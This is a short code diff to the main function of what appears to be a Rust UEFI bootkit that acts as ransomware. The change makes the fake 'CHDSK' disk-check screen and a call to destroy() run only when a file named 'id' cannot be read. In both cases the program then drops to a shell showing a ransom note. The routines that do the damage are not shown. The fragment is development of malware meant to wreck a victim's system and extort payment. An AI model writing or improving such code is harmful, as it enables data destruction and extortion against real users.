@@ -120,15 +120,16 @@ fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
         .set_watchdog_timer(0, 65536, None)
         .unwrap_success();
 
-    // Print CHDSK message
-    init_chdsk_screen(&mut st);
+    if read_file(&st, "id").is_err() {
+        // Print CHDSK message
+        init_chdsk_screen(&mut st);
 
-    // Speak for it self
-    destroy(&st);
+        // Speak for it self
+        destroy(&st);
+    }
 
     // Go to shell with ransom note
     shell_land(&mut st);
-    //loop {}
 
     Status::SUCCESS
 }
